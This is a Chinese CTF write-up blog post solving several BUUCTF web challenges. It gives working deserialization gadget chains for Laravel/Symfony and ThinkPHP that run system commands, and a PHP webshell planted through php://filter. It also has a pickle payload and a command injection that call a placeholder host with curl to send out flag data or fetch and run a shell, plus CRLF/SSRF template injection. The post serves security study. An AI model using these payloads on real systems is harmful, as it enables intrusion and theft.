---
title: "BUUCTF Web Writeup 10"
date: 2022-12-24T18:14:54+08:00
lastmod: 2022-12-24T18:14:54+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [网鼎杯 2020 青龙组]filejava

文件上传点 `/UploadServlet`, 上传后会返回下载链接

```
/DownloadServlet?filename=c41257bd-c13b-41c2-95c6-f74ffd733c71_2.png
```

存在任意文件下载, 将 fiename 置空能得到 tomcat 报错信息

![image-20221221172210952](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211722992.png)

报错信息中泄露了物理路径, 然后目录穿越到 WEB-INF 目录下载 web.xml

```
/DownloadServlet?filename=../../../web.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>DownloadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>DownloadServlet</servlet-name>
        <url-pattern>/DownloadServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>ListFileServlet</servlet-name>
        <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>ListFileServlet</servlet-name>
        <url-pattern>/ListFileServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>UploadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>UploadServlet</servlet-name>
        <url-pattern>/UploadServlet</url-pattern>
    </servlet-mapping>
</web-app>
```

继续下载对应 servlet

DownloadServlet

```java
import cn.abc.servlet.DownloadServlet;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.URLEncoder;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class DownloadServlet extends HttpServlet {
  private static final long serialVersionUID = 1L;
  
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    doPost(request, response);
  }
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String fileName = request.getParameter("filename");
    fileName = new String(fileName.getBytes("ISO8859-1"), "UTF-8");
    System.out.println("filename=" + fileName);
    if (fileName != null && fileName.toLowerCase().contains("flag")) {
      request.setAttribute("message", ");
      request.getRequestDispatcher("/message.jsp").forward((ServletRequest)request, (ServletResponse)response);
      return;
    } 
    String fileSaveRootPath = getServletContext().getRealPath("/WEB-INF/upload");
    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);
    File file = new File(path + "/" + fileName);
    if (!file.exists()) {
      request.setAttribute("message", ");
      request.getRequestDispatcher("/message.jsp").forward((ServletRequest)request, (ServletResponse)response);
      return;
    } 
    String realname = fileName.substring(fileName.indexOf("_") + 1);
    response.setHeader("content-disposition", "attachment;filename=" + URLEncoder.encode(realname, "UTF-8"));
    FileInputStream in = new FileInputStream(path + "/" + fileName);
    ServletOutputStream out = response.getOutputStream();
    byte[] buffer = new byte[1024];
    int len = 0;
    while ((len = in.read(buffer)) > 0)
      out.write(buffer, 0, len); 
    in.close();
    out.close();
  }
  
  public String findFileSavePathByFileName(String filename, String saveRootPath) {
    int hashCode = filename.hashCode();
    int dir1 = hashCode & 0xF;
    int dir2 = (hashCode & 0xF0) >> 4;
    String dir = saveRootPath + "/" + dir1 + "/" + dir2;
    File file = new File(dir);
    if (!file.exists())
      file.mkdirs(); 
    return dir;
  }
}
```

ListFileServlet

```java
import cn.abc.servlet.ListFileServlet;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ListFileServlet extends HttpServlet {
  private static final long serialVersionUID = 1L;
  
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    doPost(request, response);
  }
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String uploadFilePath = getServletContext().getRealPath("/WEB-INF/upload");
    Map<String, String> fileNameMap = new HashMap<>();
    String saveFilename = (String)request.getAttribute("saveFilename");
    String filename = (String)request.getAttribute("filename");
    System.out.println("saveFilename" + saveFilename);
    System.out.println("filename" + filename);
    String realName = saveFilename.substring(saveFilename.indexOf("_") + 1);
    fileNameMap.put(saveFilename, filename);
    request.setAttribute("fileNameMap", fileNameMap);
    request.getRequestDispatcher("/listfile.jsp").forward((ServletRequest)request, (ServletResponse)response);
  }
}
```

UploadServlet

```java
import cn.abc.servlet.UploadServlet;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.UUID;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileItemFactory;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.WorkbookFactory;

public class UploadServlet extends HttpServlet {
  private static final long serialVersionUID = 1L;
  
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    doPost(request, response);
  }
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String savePath = getServletContext().getRealPath("/WEB-INF/upload");
    String tempPath = getServletContext().getRealPath("/WEB-INF/temp");
    File tempFile = new File(tempPath);
    if (!tempFile.exists())
      tempFile.mkdir(); 
    String message = "";
    try {
      DiskFileItemFactory factory = new DiskFileItemFactory();
      factory.setSizeThreshold(102400);
      factory.setRepository(tempFile);
      ServletFileUpload upload = new ServletFileUpload((FileItemFactory)factory);
      upload.setHeaderEncoding("UTF-8");
      upload.setFileSizeMax(1048576L);
      upload.setSizeMax(10485760L);
      if (!ServletFileUpload.isMultipartContent(request))
        return; 
      List<FileItem> list = upload.parseRequest(request);
      for (FileItem fileItem : list) {
        if (fileItem.isFormField()) {
          String name = fileItem.getFieldName();
          String str = fileItem.getString("UTF-8");
          continue;
        } 
        String filename = fileItem.getName();
        if (filename == null || filename.trim().equals(""))
          continue; 
        String fileExtName = filename.substring(filename.lastIndexOf(".") + 1);
        InputStream in = fileItem.getInputStream();
        if (filename.startsWith("excel-") && "xlsx".equals(fileExtName))
          try {
            Workbook wb1 = WorkbookFactory.create(in);
            Sheet sheet = wb1.getSheetAt(0);
            System.out.println(sheet.getFirstRowNum());
          } catch (InvalidFormatException e) {
            System.err.println("poi-ooxml-3.10 has something wrong");
            e.printStackTrace();
          }  
        String saveFilename = makeFileName(filename);
        request.setAttribute("saveFilename", saveFilename);
        request.setAttribute("filename", filename);
        String realSavePath = makePath(saveFilename, savePath);
        FileOutputStream out = new FileOutputStream(realSavePath + "/" + saveFilename);
        byte[] buffer = new byte[1024];
        int len = 0;
        while ((len = in.read(buffer)) > 0)
          out.write(buffer, 0, len); 
        in.close();
        out.close();
        message = ";
      } 
    } catch (FileUploadException e) {
      e.printStackTrace();
    } 
    request.setAttribute("message", message);
    request.getRequestDispatcher("/ListFileServlet").forward((ServletRequest)request, (ServletResponse)response);
  }
  
  private String makeFileName(String filename) {
    return UUID.randomUUID().toString() + "_" + filename;
  }
  
  private String makePath(String filename, String savePath) {
    int hashCode = filename.hashCode();
    int dir1 = hashCode & 0xF;
    int dir2 = (hashCode & 0xF0) >> 4;
    String dir = savePath + "/" + dir1 + "/" + dir2;
    File file = new File(dir);
    if (!file.exists())
      file.mkdirs(); 
    return dir;
  }
}
```

在 UploadServlet 中会检测上传的文件是否为 excel 表格, 然后会调用 WorkbookFactory 去解析表格内容 

网上搜了一下发现组件是 apache poi, 存在 xxe

参考文章: [https://xz.aliyun.com/t/6996](https://xz.aliyun.com/t/6996)

随便新建一个 xlsx 文件, 然后更改 `[Content_Types].xml` 的内容为 blind xxe payload, 最后上传即可

![image-20221221172811730](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211728811.png)

## [2020 新春红包题]1

```php
<?php
error_reporting(0);

class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        // 使缓存文件名随机
        $cache_filename = $this->options['prefix'] . uniqid() . $name;
        if(substr($cache_filename, -strlen('.php')) === '.php') {
          die('?');
        }
        return $cache_filename;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return $filename;
        }

        return null;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);
```

跟之前有一题一模一样, 但 getCacheKey 方法改了一下

参考文章 (才发现是 thinkphp 的链子...)

[https://www.anquanke.com/post/id/194036](https://www.anquanke.com/post/id/194036)

[https://www.zhaoj.in/read-6397.html](https://www.zhaoj.in/read-6397.html)

新学到的两个思路

第一个思路是利用 linux 中反引号的优先级来执行命令

```php
<?php

class A {

    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

}

class B {

}

$b = new B();
$b->options = array(
    'expire' => '123',
    'prefix' => '456',
    'serialize' => 'system'
);

$a = new A($b, '789', null);
$a->autosave = false;
$a->cache = [];
$a->complete = '`cat /flag > /var/www/html/flag.txt`';

echo urlencode(serialize($a));
```

serialize 指定为 system

虽然传入的参数里面包含了 json, 但由于反引号的优先级较高, 仍然是可以执行任意命令 (无回显)

第二个思路是利用 linux 目录穿越来绕过随机字符的限制, 以及通过 `/.` 绕过 `.php` 后缀检测创建文件

```php
<?php

class A {

    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

}

class B {

}

$b = new B();
$b->options = array(
    'expire' => '123',
    'prefix' => 'php://filter/write=convert.base64-decode/resource=uploads/',
    'serialize' => 'strval'
);

$a = new A($b, '/../shell.php/.', null);
$a->autosave = false;
$a->cache = [];
$a->complete = 'aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbMTIzNF0pOz8+';

echo urlencode(serialize($a));
```

注意只有 uploads 目录可写, 剩下的构造跟之前那题一模一样

![image-20221221204320195](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212212043335.png)

## [RootersCTF2019]ImgXweb

robots.txt

```
User-agent: * 
Disallow: /static/secretkey.txt
```

访问得到 secret key 为 `you-will-never-guess`

之后随便注册一个用户, 用 secret key 伪造 jwt 指定用户为 admin

然后访问 /home 查看图片源码得到 flag

## [watevrCTF-2019]Pickle Store

cookie session 参数存在 pickle 反序列化

payload

```python
base64.b64encode(b"cos\nsystem\n(S'curl http://x.x.x.x:yyyy/ -X POST -d \"`cat flag.txt`\"'\ntR.")
```

## [安洵杯 2019]iamthinking

www.zip 源码泄露

thinkphp 6.0

Controller/Index.php

```php
<?php
namespace app\controller;
use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        
        echo "<img src='../test.jpg'"."/>";
        $paylaod = @$_GET['payload'];
        if(isset($paylaod))
        {
            $url = parse_url($_SERVER['REQUEST_URI']);
            parse_str($url['query'],$query);
            foreach($query as $value)
            {
                if(preg_match("/^O/i",$value))
                {
                    die('STOP HACKING');
                    exit();
                }
            }
            unserialize($paylaod);
        }
    }
}
```

简单绕过 `parse_url`, 然后网上随便找一条反序列化链

[https://xz.aliyun.com/t/10396](https://xz.aliyun.com/t/10396)

```php
<?php
namespace think{
    abstract class Model{
        use model\concern\Attribute;  //因为要使用里面的属性
        private $lazySave;
        private $exists;
        private $data=[];
        private $withAttr = [];
        public function __construct($obj){
            $this->lazySave = True;
            $this->withEvent = false;
            $this->exists = true;
            $this->table = $obj;
            $this->data = ['key'=>'cat /flag'];
            $this->visible = ["key"=>1];
            $this->withAttr = ['key'=>'system'];
        }
    }
}

namespace think\model\concern{
    trait Attribute
    {
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
    }

    $a = new Pivot('');
    $b = new Pivot($a);
    echo urlencode(serialize($b));
}
```

![image-20221222121937047](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212221219132.png)

## [BSidesCF 2020]Hurdles

![image-20221222123705006](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212221237077.png)

## [羊城杯 2020]Easyphp2

主页文件包含, cookie 先改成 `pass=GWHT`

过滤了 base64 rot13 等关键词, 两次 urlencode 绕过

```
/?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=GWHT.php
```

或者转成 utf-7

```
/?file=php://filter/convert.iconv.utf8.utf7/resource=GWHT.php
```

GWHT.php

```php
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>count is here</title>

    <style>

        html,
        body {
            overflow: none;
            max-height: 100vh;
        }

    </style>
</head>

<body style="height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;">

<center><img src="question.jpg" height="200" width="200" /> </center>

    <?php
    ini_set('max_execution_time', 5);

    if ($_COOKIE['pass'] !== getenv('PASS')) {
        setcookie('pass', 'PASS');
        die('<h2>'.'<hacker>'.'<h2>'.'<br>'.'<h1>'.'404'.'<h1>'.'<br>'.'Sorry, only people from GWHT are allowed to access this website.'.'23333');
    }
    ?>

    <h1>A Counter is here, but it has someting wrong</h1>

    <form>
        <input type="hidden" value="GWHT.php" name="file">
        <textarea style="border-radius: 1rem;" type="text" name="count" rows=10 cols=50></textarea><br />
        <input type="submit">
    </form>

    <?php
    if (isset($_GET["count"])) {
        $count = $_GET["count"];
        if(preg_match('/;|base64|rot13|base32|base16|<\?php|#/i', $count)){
        	die('hacker!');
        }
        echo "<h2>The Count is: " . exec('printf \'' . $count . '\' | wc -c') . "</h2>";
    }
    ?>

</body>

</html>
```

很明显的命令注入

```
/?file=GWHT.php&count='|`curl+x.x.x.x:yyyy/|bash`|echo+'1
```

反弹 shell 之后发现根目录下存在 /GWHT, 所属 GWHT 用户组

README md5 解密后为 `GWHTCTF`

尝试 su 切换到该用户, 然后查看 flag

![image-20221222142512828](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212221425883.png)

## [羊城杯 2020]Blackcat

题目有点 nt, mp3 用 hex editor 打开最底下有 php 源码

```php
if(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){
    die('
$clandestine = getenv("clandestine");
if(isset($_POST['White-cat-monitor']))
    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);
$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);
if($hh !== $_POST['Black-Cat-Sheriff']){
    die('
echo exec("nc".$_POST['One-ear']);
```

`hash_hmac()` 加密的数据如果为 array, 则返回的结果为 `NULL`, 然后用 `NULL` 去加密得到 `$hh`, 就可以执行任意命令了

```php
<?php
var_dump(hash_hmac('sha256', ';env', NULL));
```

```
Black-Cat-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&White-cat-monitor[]=&One-ear=;env
```

![image-20221222144821619](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212221448699.png)

## [CISCN2019 总决赛 Day1 Web4]Laravel1

第一次正式开始挖大框架的反序列化, 感觉还挺好玩的

```php
<?php
//backup in source.tar.gz

namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request->input("payload");
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);
        }
    }
}
```

laravel 5.8.16

拖进 phpstorm 全局搜索 `__destruct` 方法定义

期间发现了一个类似 java classloader 的类, 但没搞明白怎么利用 (太菜了)

然后找到了两三处任意文件删除, 不过对本题来说没有什么用

最后只剩下了 TagAwareAdaper.php (其实看 laravel 的日志大概也能猜出来入口点在这)

![image-20221222211807511](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212222118609.png)

跟进 invalidateTags 方法

![image-20221222212026385](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212222120522.png)

可以调用任意对象的 saveDeferred 方法

全局搜索找到了 ProxyAdapter 和 PhpArrayAdapter 两个可以利用的类

先看 ProxyAdapter

![image-20221222212850556](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212222128621.png)

存在动态函数调用

一开始以为这里不能利用, 因为 `$item` 不是 string 类型, 但搜了一下发现 system 函数可以传入两个参数

![image-20221222212938938](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212222129026.png)

将 `result_code` 赋到 `$result_code` 变量里面, 相当于弱类型, 与 `$item` 之前是什么类型一点关系都没有

而 `setInnerItem` 和 `innerItem` 两个属性均可控, 从而造成 rce

另外一个利用点是 PhpArrayAdapter

![image-20221222213432941](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212222134039.png)

它的 initialize 方法在 PhpArrayTrait 里面 (trait 是 php 实现多继承的一种方式)

![image-20221222213527005](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212222135070.png)

`file` 属性可控, 造成 lfi

最后两个链子的 payload 如下, 注意用 ProxyAdapter 构造的时候两个 `poolHash` 要相同

```php
<?php

namespace Symfony\Component\Cache\Traits {
    trait PhpArrayTrait {
        private $file;
        private $keys;
        private $values;
    }
}

namespace Symfony\Component\Cache {
    final class CacheItem {

        protected $key;
        protected $value;
        protected $isHit = false;
        protected $expiry;
        protected $defaultLifetime;
        protected $metadata = [];
        protected $newMetadata = [];
        protected $innerItem;
        protected $poolHash;
        protected $isTaggable = false;

        public function __construct($poolHash, $innerItem) {
            $this->poolHash = $poolHash;
            $this->innerItem = $innerItem;
        }
    }
}

namespace Symfony\Component\Cache\Adapter {

    use Symfony\Component\Cache\Traits\PhpArrayTrait;

    class TagAwareAdapter {
    
        private $deferred = [];
        private $createCacheItem;
        private $setCacheItemTags;
        private $getTagsByKey;
        private $invalidateTags;
        private $tags;
        private $knownTagVersions = [];
        private $knownTagVersionsTtl;

        public function __construct($deferred, $pool) {
            $this->deferred = $deferred;
            $this->pool = $pool;
        }
    }

    class ProxyAdapter {

        private $namespace;
        private $namespaceLen;
        private $createCacheItem;
        private $setInnerItem;
        private $poolHash;

        public function __construct($poolHash, $setInnerItem) {
            $this->poolHash = $poolHash;
            $this->setInnerItem = $setInnerItem;
        }
    }

    class PhpArrayAdapter {
        use PhpArrayTrait;

        public function __construct($file) {
            $this->file = $file;
        }
    }
}

namespace {

    use Symfony\Component\Cache\Adapter\PhpArrayAdapter;
    use Symfony\Component\Cache\Adapter\ProxyAdapter;
    use Symfony\Component\Cache\Adapter\TagAwareAdapter;
    use Symfony\Component\Cache\CacheItem;

    // Method 1: command exec
    $item = new CacheItem('hash', 'cat /flag');
    $deferred = array('123' => $item);
    $pool = new ProxyAdapter('hash', 'system');

    // Method 2: local file include
    // $item = new CacheItem('111', '222');
    // $deferred = array('123' => $item);
    // $pool = new PhpArrayAdapter('/flag');

    $a = new TagAwareAdapter($deferred, $pool);
    echo urlencode(serialize($a));
}
?>
```

![image-20221222213751092](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212222137247.png)

## [GYCTF2020]Node Game

```javascript
var express = require('express');
var app = express();
var fs = require('fs');
var path = require('path');
var http = require('http');
var pug = require('pug');
var morgan = require('morgan');
const multer = require('multer');


app.use(multer({dest: './dist'}).array('file'));
app.use(morgan('short'));
app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
app.use("/template",express.static(path.join(__dirname, '/template')))


app.get('/', function(req, res) {
    var action = req.query.action?req.query.action:"index";
    if( action.includes("/") || action.includes("\\") ){
        res.send("Errrrr, You have been Blocked");
    }
    file = path.join(__dirname + '/template/'+ action +'.pug');
    var html = pug.renderFile(file);
    res.send(html);
});

app.post('/file_upload', function(req, res){
    var ip = req.connection.remoteAddress;
    var obj = {
        msg: '',
    }
    if (!ip.includes('127.0.0.1')) {
        obj.msg="only admin's ip can use it"
        res.send(JSON.stringify(obj));
        return 
    }
    fs.readFile(req.files[0].path, function(err, data){
        if(err){
            obj.msg = 'upload failed';
            res.send(JSON.stringify(obj));
        }else{
            var file_path = '/uploads/' + req.files[0].mimetype +"/";
            var file_name = req.files[0].originalname
            var dir_file = __dirname + file_path + file_name
            if(!fs.existsSync(__dirname + file_path)){
                try {
                    fs.mkdirSync(__dirname + file_path)
                } catch (error) {
                    obj.msg = "file type error";
                    res.send(JSON.stringify(obj));
                    return
                }
            }
            try {
                fs.writeFileSync(dir_file,data)
                obj = {
                    msg: 'upload success',
                    filename: file_path + file_name
                } 
            } catch (error) {
                obj.msg = 'upload failed';
            }
            res.send(JSON.stringify(obj));    
        }
    })
})

app.get('/source', function(req, res) {
    res.sendFile(path.join(__dirname + '/template/source.txt'));
});


app.get('/core', function(req, res) {
    var q = req.query.q;
    var resp = "";
    if (q) {
        var url = 'http://localhost:8081/source?' + q
        console.log(url)
        var trigger = blacklist(url);
        if (trigger === true) {
            res.send("<p>error occurs!</p>");
        } else {
            try {
                http.get(url, function(resp) {
                    resp.setEncoding('utf8');
                    resp.on('error', function(err) {
                    if (err.code === "ECONNRESET") {
                     console.log("Timeout occurs");
                     return;
                    }
                   });

                    resp.on('data', function(chunk) {
                        try {
                         resps = chunk.toString();
                         res.send(resps);
                        }catch (e) {
                           res.send(e.message);
                        }
 
                    }).on('error', (e) => {
                         res.send(e.message);});
                });
            } catch (error) {
                console.log(error);
            }
        }
    } else {
        res.send("search param 'q' missing!");
    }
})

function blacklist(url) {
    var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
    var arrayLen = evilwords.length;
    for (var i = 0; i < arrayLen; i++) {
        const trigger = url.includes(evilwords[i]);
        if (trigger === true) {
            return true
        }
    }
}

var server = app.listen(8081, function() {
    var host = server.address().address
    var port = server.address().port
    console.log("Example app listening at http://%s:%s", host, port)
})
```

crlf + ssrf

参考文章 [https://www.anquanke.com/post/id/240014](https://www.anquanke.com/post/id/240014)

思路是先通过 crlf 发送上传包将文件传到 template 目录下 (minetype 跨目录), 然后渲染自己的模板文件来执行任意命令

构造 payload

```python
from urllib.parse import quote

payload = ''' HTTP/1.1


POST /file_upload HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 282
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydlC8VbfVGkiZbHjJ
Connection: close

------WebKitFormBoundarydlC8VbfVGkiZbHjJ
Content-Disposition: form-data; name="file"; filename="test.pug"
Content-Type: ../template/

#{global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()}
------WebKitFormBoundarydlC8VbfVGkiZbHjJ--


GET /'''.replace('\n', '\r\n')

enc_payload = u''

for i in payload:
    enc_payload += chr(0x0100 + ord(i))

print(quote(enc_payload))
```

这里好像必须得全部转成高位 unicode 字符, 因为题目过滤了单双引号会影响正常的 http 数据包, 但是单独把这两个字符转成高位之后再上传服务器会出错, 很奇怪

![image-20221223165136476](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212231651681.png)

![image-20221223165152137](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212231651218.png)

## [watevrCTF-2019]Supercalc

flask 编写的在线计算器

返回的 session 中保存着 code history, 因为会回显在网页上, 所以猜测是在这里进行 ssti

但是 `secret_key` 死活爆破不出来, 输入点也过滤了很多内容, 没啥思路

最后看 wp 发现构造的 payload 是这样的

```python
1/0#{{config}}
```

![image-20221223192041961](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212231920109.png)

得到 `secret_key` 为 `cded826a1e89925035cc05f0907855f7`

然后构造 session 执行命令查看 flag

![image-20221223193122155](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212231931544.png)

![image-20221223193130405](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212231931488.png)

到这里网上很多文章就已经结束了, 也没有说明为啥这种方式可以绕过...

自己去翻了翻题目的源码, 才发现题目出的很有意思

server.py

```python
import time
import traceback
import sys
from flask import Flask, render_template, session, request, render_template_string
from evalfilter import validate

app = Flask(__name__)
app.secret_key = "cded826a1e89925035cc05f0907855f7"


def format_code(code):
    if "#" in code:
        code = code[: code.index("#")]

    return code


@app.route("/", methods=["GET", "POST"])
def index():
    if not session.get("history"):
        session["history"] = []

    if request.method == "POST":
        result = validate(request.form["code"])
        if not result[0]:
            return result[1]

        session["history"].append({"code": result[1]})
        if len(session["history"]) > 5:
            session["history"] = session["history"][1:]
        session.modified = True

        try:
            eval(request.form["code"])
        except:
            error = traceback.format_exc(limit=0)[35:]
            session["history"][-1]["error"] = render_template_string(
                f'Traceback (most recent call last):\n  File "somewhere", line something, in something\n    result = {request.form["code"]}\n{error}'
            )

    history = []
    for calculation in session["history"]:
        history.append({**calculation})
        if not calculation.get("error"):
            history[-1]["result"] = eval(calculation["code"])

    return render_template("index.html", history=list(reversed(history)))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

evalfilter.py

```python
import ast

whitelist = [
    ast.Module,
    ast.Expr,

    ast.Num,

    ast.UnaryOp,

        ast.UAdd,
        ast.USub,
        ast.Not,
        ast.Invert,

    ast.BinOp,

        ast.Add,
        ast.Sub,
        ast.Mult,
        ast.Div,
        ast.FloorDiv,
        ast.Mod,
        ast.Pow,
        ast.LShift,
        ast.RShift,
        ast.BitOr,
        ast.BitXor,
        ast.BitAnd,
        ast.MatMult,

    ast.BoolOp,

        ast.And,
        ast.Or,
    
    ast.Compare,

        ast.Eq,
        ast.NotEq,
        ast.Lt,
        ast.LtE,
        ast.Gt,
        ast.GtE,
        ast.Is,
        ast.IsNot,
        ast.In,
        ast.NotIn,

]

operators = {
    
        ast.UAdd: "+",
        ast.USub: "-",
        ast.Not: "not ",
        ast.Invert: "~",

        ast.Add: " + ",
        ast.Sub: " - ",
        ast.Mult: " * ",
        ast.Div: " / ",
        ast.FloorDiv: " // ",
        ast.Mod: " * ",
        ast.Pow: " ** ",
        ast.LShift: " << ",
        ast.RShift: " >> ",
        ast.BitOr: " | ",
        ast.BitXor: " ^ ",
        ast.BitAnd: " & ",
        ast.MatMult: " @ ",

        ast.And: " and ",
        ast.Or: " or ",

        ast.Eq: " == ",
        ast.NotEq: " != ",
        ast.Lt: " < ",
        ast.LtE: " <= ",
        ast.Gt: " > ",
        ast.GtE: " >= ",
        ast.Is: " is ",
        ast.IsNot: " is not ",
        ast.In: " in ",
        ast.NotIn: " not in ",
}

def format_ast(node):

    if isinstance(node, ast.Expression):
        code = format_ast(node.body)
        if code[0] == "(" and code[-1] == ")":
            code = code[1:-1]
        return code
    if isinstance(node, ast.Num):
        return str(node.n)
    if isinstance(node, ast.UnaryOp):
        return operators[node.op.__class__] + format_ast(node.operand)
    if isinstance(node, ast.BinOp):
        return (
            "("
            + format_ast(node.left)
            + operators[node.op.__class__]
            + format_ast(node.right)
            + ")"
        )
    if isinstance(node, ast.BoolOp):
        return (
            "("
            + operators[node.op.__class__].join(
                [format_ast(value) for value in node.values]
            )
            + ")"
        )
